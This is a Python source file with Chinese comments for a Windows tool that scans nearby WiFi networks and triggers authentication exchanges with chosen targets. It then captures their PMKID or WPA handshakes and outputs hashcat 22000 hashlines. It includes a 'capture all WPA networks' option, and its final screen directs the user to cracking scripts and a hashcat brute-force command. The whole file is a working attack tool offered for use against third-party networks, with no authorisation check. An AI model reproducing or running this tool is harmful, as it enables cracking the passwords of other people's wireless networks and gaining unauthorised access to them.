#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WiFi握手包捕获工具 - Windows交互式独立版
功能：扫描WiFi → 选择目标 → 捕获PMKID/握手包 → 输出.22000 hashline
支持：netsh扫描 + netsh trace ETW捕获 + Scapy+Npcap捕获
打包：pyinstaller --onefile capture.py → capture.exe
"""

import subprocess
import time
import os
import sys
import struct
import tempfile
import threading
import random
import string
from dataclasses import dataclass
from typing import List, Optional, Tuple

# ============================================================================
# 脚本所在目录为工作目录
# ============================================================================
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
CAPTURE_DIR = os.path.join(SCRIPT_DIR, "captures")
os.makedirs(CAPTURE_DIR, exist_ok=True)

# ============================================================================
# 数据结构
# ============================================================================
@dataclass
class WiFiNetwork:
    """WiFi网络信息"""
    ssid: str
    bssid: str = ""
    signal: int = 0
    security: str = ""
    channel: int = 0
    band: str = ""

@dataclass
class CaptureResult:
    """捕获结果"""
    success: bool = False
    hashline: str = ""
    hash_file: str = ""
    method: str = ""
    error: str = ""

# ============================================================================
# netsh通用执行器（自动GBK解码）
# ============================================================================
import re as _re
_MAC_RE = _re.compile(r'[0-9a-fA-F]{2}[:\-][0-9a-fA-F]{2}[:\-][0-9a-fA-F]{2}[:\-]'
                       r'[0-9a-fA-F]{2}[:\-][0-9a-fA-F]{2}[:\-][0-9a-fA-F]{2}')

def _run_cmd(args: list, timeout: int = 15) -> str:
    """运行命令，自动用系统编码解码（不硬编码UTF-8）"""
    try:
        r = subprocess.run(args, capture_output=True, timeout=timeout)
        for enc in ['gbk', 'cp936', 'utf-8', 'latin-1']:
            try:
                return r.stdout.decode(enc)
            except UnicodeDecodeError:
                continue
        return r.stdout.decode('utf-8', errors='replace')
    except Exception:
        return ''

# ============================================================================
# 检查无线接口是否存在
# ============================================================================
def check_wlan_interface() -> Optional[str]:
    """检查系统是否存在无线接口，返回接口名或None"""
    out = _run_cmd(['netsh', 'wlan', 'show', 'interfaces'])
    if not out or 'wlan' not in out.lower() and 'wi-fi' not in out.lower() and 'wireless' not in out.lower():
        # 再检查是否有接口名
        m = _MAC_RE.search(out)
        if not m and ('没有' in out or 'no wireless' in out.lower() or not out.strip()):
            return None
    # 提取接口名
    for line in out.split('\n'):
        line_s = line.strip()
        # 匹配 "名称 : xxx" 或 "Name : xxx"
        if _re.match(r'^\s*(名称|Name)\s*[:：]', line_s, _re.IGNORECASE):
            val = line_s.split(':', 1)[-1].strip() if ':' in line_s else line_s.split('：', 1)[-1].strip()
            if val:
                return val
    return 'WLAN'  # 有输出但解析不到名称，返回默认值

# ============================================================================
# WiFi扫描（不硬编码UTF-8 / signal非必填 / 隐藏SSID保留 / 按bssid去重）
# ============================================================================
def scan_wifi() -> List[WiFiNetwork]:
    """用netsh扫描WiFi，按bssid去重，signal非必填，隐藏SSID保留"""
    # 先检查无线接口
    iface = check_wlan_interface()
    if not iface:
        print("  [!] 未检测到无线网卡接口")
        print("  [!] 请检查: 设备管理器 → 网络适配器 → 是否有WiFi网卡")
        return []

    # 主动触发WiFi扫描刷新（不是disconnect，不会断网）
    print("  触发WiFi扫描...")
    subprocess.run(['cmd', '/c', 'netsh', 'wlan', 'show', 'networks'], 
                  capture_output=True, timeout=5)
    time.sleep(4)  # 等待驱动刷新扫描列表

    output = ''
    for attempt in range(3):
        output = _run_cmd(['netsh', 'wlan', 'show', 'networks', 'mode=bssid'])
        if output and _MAC_RE.search(output):
            break
        if attempt < 2:
            w = 4 * (attempt + 1)
            print(f"  等待扫描刷新({w}秒)...")
            time.sleep(w)

    if not output or not _MAC_RE.search(output):
        print("  [!] 未扫描到任何WiFi网络")
        if output:
            for line in output.split('\n')[:8]:
                if line.strip():
                    print(f"  | {line.rstrip()}")
        return []

    # ── 纯正则解析：不依赖中英文关键词，只靠结构 ──
    # netsh输出结构: 每个网络以SSID行开头，后跟若干属性行，BSSID行包含MAC
    networks = []
    cur_ssid = ''
    cur_sec = ''
    cur = {}

    for line in output.split('\n'):
        raw = line.rstrip()
        stripped = raw.strip()
        if not stripped:
            continue

        # 分割键值（冒号或全角冒号）
        kv_val = ''
        if ':' in stripped:
            kv_val = stripped.split(':', 1)[1].strip()
        elif '：' in stripped:
            kv_val = stripped.split('：', 1)[1].strip()

        upper = stripped.upper()

        # SSID行：以"SSID"开头且不含"BSSID"
        if _re.match(r'^SSID\s', upper) and 'BSSID' not in upper:
            cur_ssid = kv_val if kv_val else '<Hidden>'
            cur_sec = ''
            cur = {'ssid': cur_ssid}
            continue

        # BSSID行：包含MAC地址
        if 'BSSID' in upper:
            m = _MAC_RE.search(stripped)
            if m:
                # 保存上一条（如果有）
                if 'bssid' in cur and cur.get('ssid'):
                    networks.append(WiFiNetwork(**cur))
                cur = {'ssid': cur_ssid, 'bssid': m.group(0), 'signal': 0,
                       'security': cur_sec, 'channel': 0, 'band': ''}
            continue

        # 以下只在有bssid的情况下解析属性
        if 'bssid' not in cur:
            # 可能是安全类型行（在BSSID之前出现）
            if '%' not in stripped and not stripped[0:1].isdigit():
                # 排除信号/频道行，剩下的可能是安全类型
                if any(kw in stripped for kw in ['WPA', 'WEP', 'Open', '开放', 'PSK', 'Enterprise', '企业']):
                    cur_sec = kv_val if kv_val else stripped
            continue

        # 信号行：包含百分号
        if '%' in stripped:
            m2 = _re.search(r'(\d+)\s*%', stripped)
            if m2:
                cur['signal'] = int(m2.group(1))
            continue

        # 频道行：纯数字值且<200
        if kv_val and kv_val.isdigit() and int(kv_val) < 200 and 'channel' not in stripped.lower():
            # 可能是频道（不依赖关键词，靠值范围判断）
            cur['channel'] = int(kv_val)
            continue

        # 频道（关键词匹配兜底）
        if any(kw in stripped.lower() for kw in ['channel', '频道', '頻道']):
            m3 = _re.search(r'(\d+)', kv_val)
            if m3 and int(m3.group(1)) < 200:
                cur['channel'] = int(m3.group(1))
            continue

        # 安全类型（如果BSSID之后还有）
        if any(kw in stripped for kw in ['WPA', 'WEP', 'Open', '开放', 'PSK']):
            cur['security'] = kv_val if kv_val else stripped

    # 保存最后一条
    if 'bssid' in cur and cur.get('ssid'):
        networks.append(WiFiNetwork(**{k: cur.get(k, '' if isinstance(WiFiNetwork.__dataclass_fields__[k].default, str) else 0) for k in WiFiNetwork.__dataclass_fields__}))

    # 修正：简单构建最后一条
    if 'bssid' in cur and cur.get('ssid') and not any(n.bssid == cur['bssid'] for n in networks):
        networks.append(WiFiNetwork(
            ssid=cur.get('ssid', ''), bssid=cur.get('bssid', ''),
            signal=cur.get('signal', 0), security=cur.get('security', ''),
            channel=cur.get('channel', 0), band=cur.get('band', '')))

    # 按bssid去重（不是按ssid）
    seen_bssid = {}
    for n in networks:
        if n.bssid and n.bssid not in seen_bssid:
            seen_bssid[n.bssid] = n
    return sorted(seen_bssid.values(), key=lambda x: x.signal, reverse=True)

# ============================================================================
# 获取本机WiFi MAC地址
# ============================================================================
def get_local_mac() -> str:
    """获取本机WiFi网卡MAC地址"""
    # 方式1: netsh wlan show interfaces
    out = _run_cmd(['netsh', 'wlan', 'show', 'interfaces'])
    for line in out.split('\n'):
        if any(kw in line for kw in ['物理地址', 'Physical address', 'physical address']):
            m = _MAC_RE.search(line)
            if m:
                return m.group(0).replace(':', '').replace('-', '').lower()
    # 方式2: getmac
    out2 = _run_cmd(['getmac', '/v', '/fo', 'list'], timeout=5)
    found = False
    for line in out2.split('\n'):
        if any(kw in line.lower() for kw in ['wi-fi', 'wlan', 'wireless']):
            found = True
        if found:
            m = _MAC_RE.search(line)
            if m:
                return m.group(0).replace(':', '').replace('-', '').lower()
    # 方式3: 手动输入
    print("  [!] 无法自动获取WiFi MAC地址")
    mac_input = input("  请输入WiFi MAC (如 aa:bb:cc:dd:ee:ff): ").strip()
    if mac_input:
        return mac_input.replace(':', '').replace('-', '').lower()
    return "000000000000"

# ============================================================================
# hashline有效性验证（根据hashcat 22000格式规范）
# ============================================================================
def validate_hashline(hashline: str) -> Tuple[bool, str]:
    """
    验证hashline是否符合hashcat 22000格式规范
    返回: (有效, 详细信息)
    """
    parts = hashline.strip().split('*')

    # 基本字段数检查
    if len(parts) < 6:
        return False, f"字段不足(需>=6, 实际{len(parts)})"
    if parts[0] != 'WPA':
        return False, f"头部不是WPA"

    htype = parts[1]
    issues = []

    if htype == '01':
        # PMKID: WPA*01*PMKID*MAC_AP*MAC_STA*ESSID***MP
        if len(parts[2]) != 32:
            issues.append(f"PMKID长度错误({len(parts[2])}!=32)")
        if len(parts[3]) != 12:
            issues.append(f"MAC_AP长度错误({len(parts[3])}!=12)")
        if parts[4] == '000000000000':
            issues.append("MAC_STA全零(无法验证MIC)")
        if len(parts[5]) < 2:
            issues.append("ESSID为空")
    elif htype == '02':
        # EAPoL: WPA*02*MIC*MAC_AP*MAC_STA*ESSID*NONCE_AP*EAPOL*MP
        if len(parts) < 9:
            return False, f"EAPoL字段不足(需>=9, 实际{len(parts)})"
        if len(parts[2]) != 32:
            issues.append(f"MIC长度错误({len(parts[2])}!=32)")
        if parts[2] == '0' * 32:
            issues.append("MIC全零(握手包不完整)")
        if len(parts[3]) != 12:
            issues.append(f"MAC_AP长度错误({len(parts[3])}!=12)")
        if parts[4] == '000000000000':
            issues.append("MAC_STA全零(无法验证MIC,密码不可破)")
        if len(parts[5]) < 2:
            issues.append("ESSID为空")
        if len(parts[6]) != 64:
            issues.append(f"ANonce长度错误({len(parts[6])}!=64)")
        if parts[6] == '0' * 64:
            issues.append("ANonce全零(握手包损坏)")
        if len(parts[7]) < 100:
            issues.append(f"EAPoL数据太短({len(parts[7])}字符)")
    else:
        return False, f"未知类型({htype})"

    # 解析SSID用于显示
    ssid = ''
    try:
        ssid = bytes.fromhex(parts[5]).decode('utf-8', errors='replace')
    except:
        ssid = parts[5][:20]

    mac_ap = parts[3] if len(parts) > 3 else ''
    bssid = ':'.join(mac_ap[i:i+2] for i in range(0, 12, 2)) if len(mac_ap) == 12 else mac_ap

    if issues:
        return False, f"SSID={ssid} BSSID={bssid} | 问题: {'; '.join(issues)}"
    return True, f"SSID={ssid} BSSID={bssid} | {'PMKID' if htype=='01' else 'EAPoL M1+M2'} 格式正确"

# ============================================================================
# 触发EAPOL交换（用随机密码连接目标AP）
# ============================================================================
def trigger_eapol(ssid: str, bssid: str):
    """用随机密码连接目标AP，触发EAPOL交换"""
    random_pwd = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    xml_path = None

    try:
        ssid_hex = ssid.encode('utf-8').hex()
        ssid_esc = ssid.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
        profile_name = f"{ssid_esc}_capture"

        xml = f"""<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{profile_name}</name>
    <SSIDConfig>
        <SSID>
            <hex>{ssid_hex}</hex>
            <name>{ssid_esc}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>manual</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{random_pwd}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>"""

        with tempfile.NamedTemporaryFile(mode='w', suffix='.xml', delete=False,
                                        encoding='utf-8') as f:
            f.write(xml)
            xml_path = f.name

        # 添加profile并连接（不解码输出，避免编码问题）
        subprocess.run(['netsh', 'wlan', 'add', 'profile', f'filename={xml_path}'],
                      capture_output=True, timeout=5)
        subprocess.run(['netsh', 'wlan', 'connect', f'name={profile_name}'],
                      capture_output=True, timeout=5)

        # 等待EAPOL交换
        time.sleep(4)

        # 断开并清理
        subprocess.run(['netsh', 'wlan', 'disconnect'],
                      capture_output=True, timeout=5)
        time.sleep(1)
        subprocess.run(['netsh', 'wlan', 'delete', 'profile', f'name={profile_name}'],
                      capture_output=True, timeout=5)
    except Exception as e:
        print(f"    [!] 触发EAPOL错误: {e}")
    finally:
        if xml_path:
            try:
                os.unlink(xml_path)
            except:
                pass

# ============================================================================
# 方式A：netsh trace ETW 捕获（不需要第三方库）
# ============================================================================
def capture_netsh(ssid: str, bssid: str) -> CaptureResult:
    """用netsh trace捕获EAPOL/PMKID（需管理员权限）"""
    trace_file = os.path.join(CAPTURE_DIR, "wifi_trace.etl")

    print("    [1/5] 停止旧跟踪...")
    subprocess.run(['netsh', 'trace', 'stop'], capture_output=True, timeout=30)
    time.sleep(2)

    # 清理旧文件
    for f in [trace_file, trace_file.replace('.etl', '.cab')]:
        if os.path.exists(f):
            try:
                os.remove(f)
            except:
                pass

    # 启动跟踪（增加WiFi关键字过滤提高捕获率）
    print("    [2/5] 启动网络跟踪（需管理员权限）...")
    try:
        result = subprocess.run(
            ['netsh', 'trace', 'start', 'capture=yes',
             f'traceFile={trace_file}', 'maxSize=50', 'overwrite=yes',
             'report=disabled'],
            capture_output=True, timeout=20
        )
        if result.returncode != 0:
            # 用GBK解码错误信息
            err = result.stdout.decode('gbk', errors='replace') + result.stderr.decode('gbk', errors='replace')
            if any(kw in err for kw in ['需要提升', 'elevation', '拒绝访问', 'denied', 'Elevation']):
                return CaptureResult(error="需要管理员权限！请右键 → 以管理员身份运行")
            return CaptureResult(error=f"启动跟踪失败: {err[:200]}")
        print("    [OK] 网络跟踪已启动")
    except subprocess.TimeoutExpired:
        return CaptureResult(error="启动跟踪超时")

    # 多次触发EAPOL交换（提高捕获概率）
    for attempt in range(1, 4):
        print(f"    [3/5] 第{attempt}次触发EAPOL交换（连接 {ssid}）...")
        trigger_eapol(ssid, bssid)
        time.sleep(2)

    # 额外等待确保数据写入
    print("    [4/5] 等待数据写入...")
    time.sleep(3)

    # 停止跟踪
    print("    [5/5] 停止跟踪并解析...")
    subprocess.run(['netsh', 'trace', 'stop'], capture_output=True, timeout=60)
    time.sleep(2)

    if not os.path.exists(trace_file):
        return CaptureResult(error="跟踪文件未生成")

    etl_size = os.path.getsize(trace_file)
    print(f"    ETL文件: {etl_size:,} bytes")

    # 解析ETL文件
    return parse_etl(trace_file, ssid, bssid)

# ============================================================================
# 解析ETL文件提取PMKID或握手包
# ============================================================================
def parse_etl(etl_file: str, ssid: str, bssid: str) -> CaptureResult:
    """从ETL文件中提取PMKID或EAPoL握手包（宽松搜索模式）"""
    try:
        with open(etl_file, 'rb') as f:
            data = f.read()

        mac_ap = bssid.lower().replace(':', '').replace('-', '')
        mac_cl = get_local_mac()
        essid_hex = ssid.encode('utf-8').hex()
        bssid_bytes = bytes.fromhex(mac_ap) if len(mac_ap) == 12 else b''

        print(f"    解析ETL: {len(data):,} bytes, BSSID={mac_ap}, CLIENT={mac_cl}")

        # ── 尝试1: 搜索所有PMKID标记（不绑定BSSID位置） ──
        pmkid_tag = bytes([0xdd, 0x14, 0x00, 0x0f, 0xac, 0x04])
        pmkid_positions = []
        search_pos = 0
        while True:
            idx = data.find(pmkid_tag, search_pos)
            if idx == -1:
                break
            pmkid_positions.append(idx)
            search_pos = idx + 1

        print(f"    PMKID标记找到: {len(pmkid_positions)} 处")

        for idx in pmkid_positions:
            pmkid = data[idx + 6: idx + 6 + 16]
            if len(pmkid) == 16 and pmkid.hex() != '0' * 32:
                # 检查附近是否有BSSID（扩大搜索范围到前后256字节）
                nearby = data[max(0, idx - 256):idx + 256]
                has_bssid = (not bssid_bytes) or (bssid_bytes in nearby)
                if has_bssid:
                    hashline = f"WPA*01*{pmkid.hex()}*{mac_ap}*{mac_cl}*{essid_hex}***"
                    hash_file = os.path.join(CAPTURE_DIR, f"{ssid}_pmkid.22000")
                    with open(hash_file, 'w') as f:
                        f.write(hashline + '\n')
                    print(f"    [+] PMKID找到! 偏移={idx}")
                    return CaptureResult(
                        success=True, hashline=hashline,
                        hash_file=hash_file, method="PMKID (netsh trace)"
                    )

        # ── 尝试2: 搜索EAPoL帧（宽松模式，不严格绑定BSSID） ──
        eapol_marker = b'\x88\x8e'
        m1_frames = []
        m2_frames = []
        eapol_count = 0

        pos = 0
        while True:
            pos = data.find(eapol_marker, pos)
            if pos == -1:
                break
            # 宽松匹配：不强制要求BSSID在附近（ETL格式不保证位置）
            if pos + 10 < len(data):
                # EAPoL帧: 跳过0x888e(2bytes) → ver(1)+type(1)+len(2)
                eapol_type = data[pos + 3]
                if eapol_type == 0x03:  # EAPoL-Key
                    eapol_count += 1
                    key_len = (data[pos + 4] << 8) | data[pos + 5]
                    eapol_start = pos + 2
                    eapol_end = eapol_start + 4 + key_len
                    if 50 < key_len < 1000 and eapol_end <= len(data):
                        fd = data[eapol_start:eapol_end]
                        if len(fd) > 49:
                            ki = (fd[5] << 8) | fd[6]
                            has_ack = bool(ki & 0x0080)
                            has_mic = bool(ki & 0x0100)
                            if has_ack and not has_mic:
                                m1_frames.append({'anonce': fd[17:49], 'raw': fd, 'pos': pos})
                            elif has_mic and not has_ack:
                                m2_frames.append({'raw': fd, 'pos': pos})
            pos += 2

        print(f"    EAPoL-Key帧: {eapol_count} 个 (M1={len(m1_frames)}, M2={len(m2_frames)})")

        if m1_frames and m2_frames:
            m1 = m1_frames[0]
            m2 = m2_frames[0]
            anonce_hex = m1['anonce'].hex()
            mic_hex = m2['raw'][81:97].hex() if len(m2['raw']) > 96 else '0' * 32
            m2_zeroed = bytearray(m2['raw'])
            if len(m2_zeroed) > 96:
                m2_zeroed[81:97] = b'\x00' * 16
            hashline = (f"WPA*02*{mic_hex}*{mac_ap}*{mac_cl}*"
                       f"{essid_hex}*{anonce_hex}*{m2_zeroed.hex()}*00")
            hash_file = os.path.join(CAPTURE_DIR, f"{ssid}_handshake.22000")
            with open(hash_file, 'w') as f:
                f.write(hashline + '\n')
            print(f"    [+] 握手包找到! M1偏移={m1['pos']}, M2偏移={m2['pos']}")
            return CaptureResult(
                success=True, hashline=hashline,
                hash_file=hash_file, method="EAPoL握手包 (netsh trace)"
            )

        # 搜索0x888e标记总数（调试用）
        total_888e = data.count(eapol_marker)
        return CaptureResult(
            error=f"ETL中0x888e标记={total_888e}, EAPoL-Key={eapol_count}, M1={len(m1_frames)}, M2={len(m2_frames)}"
        )

    except Exception as e:
        return CaptureResult(error=f"ETL解析失败: {e}")

# ============================================================================
# 方式B：Scapy + Npcap 捕获（可选）
# ============================================================================
def capture_scapy(ssid: str, bssid: str) -> CaptureResult:
    """用Scapy+Npcap嗅探EAPOL帧"""
    try:
        from scapy.all import sniff, EAPOL, Ether, get_if_list
    except ImportError:
        return CaptureResult(error="scapy未安装 (pip install scapy)")

    # 检查Npcap
    npcap_ok = any(os.path.exists(p) for p in
                   [r'C:\Program Files\Npcap', r'C:\Program Files (x86)\Npcap'])
    if not npcap_ok:
        return CaptureResult(error="Npcap未安装 (下载: https://npcap.com)")

    # 查找WiFi接口
    ifaces = get_if_list()
    interface = None
    for iface in ifaces:
        if any(kw in iface.lower() for kw in ['wi-fi', 'wlan', 'wireless']):
            interface = iface
            break
    if not interface and ifaces:
        interface = ifaces[0]
    if not interface:
        return CaptureResult(error="未找到网络接口")

    print(f"    接口: {interface}")
    eapol_frames = []
    stop_event = threading.Event()

    def callback(pkt):
        if pkt.haslayer(EAPOL) or (pkt.haslayer(Ether) and pkt[Ether].type == 0x888e):
            eapol_frames.append(bytes(pkt))
            print(f"    捕获到EAPOL帧! (长度={len(bytes(pkt))})")

    def sniffer():
        try:
            sniff(iface=interface, prn=callback, filter="ether proto 0x888e",
                  timeout=20, store=0, stop_filter=lambda x: stop_event.is_set())
        except:
            pass

    t = threading.Thread(target=sniffer, daemon=True)
    t.start()
    time.sleep(1)

    print(f"    触发EAPOL交换...")
    trigger_eapol(ssid, bssid)
    time.sleep(10)
    stop_event.set()
    t.join(timeout=3)

    if not eapol_frames:
        return CaptureResult(error="未捕获到EAPOL帧")

    # 解析PMKID
    mac_ap = bssid.lower().replace(':', '').replace('-', '')
    mac_cl = get_local_mac()
    essid_hex = ssid.encode('utf-8').hex()

    for frame_data in eapol_frames:
        pmkid_tag = bytes([0xdd, 0x14, 0x00, 0x0f, 0xac, 0x04])
        idx = frame_data.find(pmkid_tag)
        if idx != -1:
            pmkid = frame_data[idx + 6: idx + 6 + 16]
            if len(pmkid) == 16:
                hashline = f"WPA*01*{pmkid.hex()}*{mac_ap}*{mac_cl}*{essid_hex}***"
                hash_file = os.path.join(CAPTURE_DIR, f"{ssid}_pmkid.22000")
                with open(hash_file, 'w') as f:
                    f.write(hashline + '\n')
                return CaptureResult(
                    success=True, hashline=hashline,
                    hash_file=hash_file, method="PMKID (Scapy)"
                )

    return CaptureResult(error="EAPOL帧中未找到PMKID")

# ============================================================================
# 交互式主程序
# ============================================================================
def main():
    print()
    print("  ╔══════════════════════════════════════════════════╗")
    print("  ║     WiFi握手包捕获工具 v1.0 (Windows)           ║")
    print("  ║     扫描WiFi → 选择目标 → 捕获PMKID/握手包     ║")
    print("  ║     输出.22000 hashline用于hashcat GPU破解      ║")
    print("  ╚══════════════════════════════════════════════════╝")
    print()

    # 检查管理员权限
    try:
        is_admin = subprocess.run(
            'net session', shell=True, capture_output=True, timeout=3
        ).returncode == 0
    except:
        is_admin = False

    if not is_admin:
        print("  [!] 警告: 未以管理员身份运行！")
        print("  [!] 握手包捕获需要管理员权限（netsh trace）")
        print("  [!] 请右键EXE → 以管理员身份运行")
        print()
        input("  按回车键继续（功能可能受限）...")
        print()

    while True:
        print("  ┌─────────────────────────────┐")
        print("  │  1. 扫描附近WiFi            │")
        print("  │  2. 捕获指定SSID的握手包    │")
        print("  │  3. 批量捕获所有WiFi        │")
        print("  │  4. 查看已捕获的hashline    │")
        print("  │  0. 退出                    │")
        print("  └─────────────────────────────┘")
        choice = input("\n  请选择: ").strip()

        if choice == '0' or choice.lower() == 'q':
            print("\n  再见!")
            break

        elif choice == '1':
            # 扫描WiFi
            print("\n  [*] 扫描中...")
            networks = scan_wifi()
            if not networks:
                print("  [!] 未扫描到WiFi网络")
                continue
            print(f"\n  扫描到 {len(networks)} 个WiFi网络:\n")
            print(f"  {'#':>4s}  {'SSID':<28s}  {'信号':>4s}  {'安全类型':<16s}  {'BSSID':<19s}  {'频道':>4s}")
            print(f"  {'─'*4}  {'─'*28}  {'─'*4}  {'─'*16}  {'─'*19}  {'─'*4}")
            for i, n in enumerate(networks):
                print(f"  {i+1:>4d}  {n.ssid:<28s}  {n.signal:>3d}%  {n.security:<16s}  {n.bssid:<19s}  {n.channel:>4d}")

            # 选择目标
            print()
            sel = input("  输入编号选择目标（多个用逗号分隔，all=全选，回车=返回）: ").strip()
            if not sel:
                continue

            targets = []
            if sel.lower() == 'all':
                targets = networks
            else:
                for s in sel.split(','):
                    try:
                        idx = int(s.strip()) - 1
                        if 0 <= idx < len(networks):
                            targets.append(networks[idx])
                    except:
                        pass

            if not targets:
                print("  [!] 未选择有效目标")
                continue

            # 逐个捕获
            results = []
            for i, t in enumerate(targets):
                print(f"\n  ── 目标 [{i+1}/{len(targets)}] {t.ssid} ({t.bssid}) ──")
                r = capture_one(t.ssid, t.bssid)
                results.append((t, r))

            # 汇总结果
            show_results(results)

        elif choice == '2':
            # 指定SSID捕获
            ssid = input("\n  输入目标SSID: ").strip()
            if not ssid:
                continue
            bssid = input("  输入目标BSSID（可选，回车跳过）: ").strip()
            if not bssid:
                # 尝试扫描获取BSSID
                print("  [*] 扫描获取BSSID...")
                nets = scan_wifi()
                for n in nets:
                    if n.ssid == ssid:
                        bssid = n.bssid
                        print(f"  [+] 找到BSSID: {bssid}")
                        break
                if not bssid:
                    bssid = "00:00:00:00:00:00"
                    print("  [!] 未找到BSSID，使用默认值")

            print(f"\n  ── 捕获 {ssid} ({bssid}) ──")
            r = capture_one(ssid, bssid)
            show_results([(WiFiNetwork(ssid=ssid, bssid=bssid), r)])

        elif choice == '3':
            # 批量捕获
            print("\n  [*] 扫描中...")
            networks = scan_wifi()
            if not networks:
                print("  [!] 未扫描到WiFi网络")
                continue
            # 只捕获WPA/WPA2类型的
            wpa_nets = [n for n in networks if 'WPA' in n.security.upper() or 'PSK' in n.security.upper()]
            if not wpa_nets:
                print("  [!] 未找到WPA/WPA2网络")
                continue
            print(f"  [*] 将捕获 {len(wpa_nets)} 个WPA/WPA2网络的握手包")
            results = []
            for i, t in enumerate(wpa_nets):
                print(f"\n  ── [{i+1}/{len(wpa_nets)}] {t.ssid} ({t.bssid}) ──")
                r = capture_one(t.ssid, t.bssid)
                results.append((t, r))
            show_results(results)

        elif choice == '4':
            # 查看已捕获
            show_captured_files()

        else:
            print("  [!] 无效选择")

def capture_one(ssid: str, bssid: str) -> CaptureResult:
    """捕获单个目标：先尝试netsh trace，失败则尝试Scapy"""
    # 方式A: netsh trace（纯Windows原生）
    print("    [方式A] netsh trace ETW捕获...")
    r = capture_netsh(ssid, bssid)
    if r.success:
        print(f"    [+] 捕获成功! 方式={r.method}")
        return r
    print(f"    [-] 方式A: {r.error}")

    # 方式B: Scapy + Npcap（需要第三方库）
    print("    [方式B] Scapy + Npcap捕获...")
    r = capture_scapy(ssid, bssid)
    if r.success:
        print(f"    [+] 捕获成功! 方式={r.method}")
        return r
    print(f"    [-] 方式B: {r.error}")

    return CaptureResult(error=f"两种方式均失败")

def show_results(results: list):
    """美化结果展示 + hashline有效性验证"""
    print()
    print("  ╔══════════════════════════════════════════════════╗")
    print("  ║              捕 获 结 果 汇 总                  ║")
    print("  ╠══════════════════════════════════════════════════╣")

    ok = 0
    all_hl = []
    for net, r in results:
        if r.success:
            ok += 1
            all_hl.append(r.hashline)
            print(f"  ║  ✓ {net.ssid:<20s}  {r.method}")
        else:
            print(f"  ║  ✗ {net.ssid:<20s}  {r.error[:40]}")

    print(f"  ╠══════════════════════════════════════════════════╣")
    print(f"  ║  成功: {ok}/{len(results)}")
    print(f"  ╚══════════════════════════════════════════════════╝")

    if not all_hl:
        print()
        print("  未成功捕获握手包。建议:")
        print("  · 安装 Npcap (https://npcap.com) 启用Scapy方式")
        print("  · 使用 Linux + hcxdumptool 抓包（最可靠）")
        print("  · 确保以管理员权限运行")
        return

    # 保存文件
    merged = os.path.join(CAPTURE_DIR, "all_hashes.22000")
    with open(merged, 'w') as f:
        for h in all_hl:
            f.write(h + '\n')

    # hashline有效性验证
    print()
    print("  ┌──────────────────────────────────────────────┐")
    print("  │  Hashline 有效性检查                         │")
    print("  ├──────────────────────────────────────────────┤")
    all_valid = True
    for h in all_hl:
        valid, info = validate_hashline(h)
        mark = '✓' if valid else '✗'
        print(f"  │  {mark} {info}")
        if not valid:
            all_valid = False
    print("  └──────────────────────────────────────────────┘")

    if not all_valid:
        print()
        print("  ⚠ 部分hashline存在问题，hashcat可能无法破解")
        print("  · MAC_STA全零 → 需要正确的客户端MAC地址")
        print("  · MIC/ANonce全零 → 握手包数据不完整")

    # 显示文件信息
    print()
    print(f"  📁 .22000文件: {merged}")
    print(f"     行数: {len(all_hl)} | 大小: {os.path.getsize(merged)} bytes")

    # 显示hashline内容
    print()
    print("  ┌──────────────────────────────────────────────┐")
    print("  │  Hashline 内容（复制用于hashcat破解）        │")
    print("  └──────────────────────────────────────────────┘")
    print()
    for h in all_hl:
        print(h)
    print()

    # 复制到剪贴板
    try:
        p = subprocess.Popen(['clip'], stdin=subprocess.PIPE)
        p.communicate('\n'.join(all_hl).encode('utf-8'))
        print("  📋 已复制到剪贴板!")
    except:
        pass

    print()
    print("  下一步破解:")
    print("  · Colab:   粘贴到Notebook的RAW_PASTE中运行")
    print("  · Mac:     bash crack-local.sh")
    print("  · 云服务器: bash crack.sh")
    print(f"  · hashcat: hashcat -m 22000 {merged} -a 3 '?d?d?d?d?d?d?d?d'")

def show_captured_files():
    """显示已捕获的文件"""
    print(f"\n  捕获目录: {CAPTURE_DIR}")
    files = [f for f in os.listdir(CAPTURE_DIR) if f.endswith('.22000')]
    if not files:
        print("  [!] 暂无捕获文件")
        return
    print(f"  共 {len(files)} 个文件:\n")
    all_lines = []
    for f in sorted(files):
        fpath = os.path.join(CAPTURE_DIR, f)
        with open(fpath) as fp:
            lines = [l.strip() for l in fp if l.strip().startswith('WPA*')]
        print(f"  {f} ({len(lines)} 条hashline)")
        all_lines.extend(lines)

    if all_lines:
        print(f"\n  ── 所有hashline ──")
        for h in all_lines:
            print(f"  {h}")

# ============================================================================
# 入口（防闪退：全局异常捕获 + 退出前等待按键）
# ============================================================================
if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('\n\n  已中断')
    except Exception as e:
        print(f'\n  [!] 程序异常: {e}')
        import traceback
        traceback.print_exc()
    finally:
        print()
        input('  按回车键退出...')
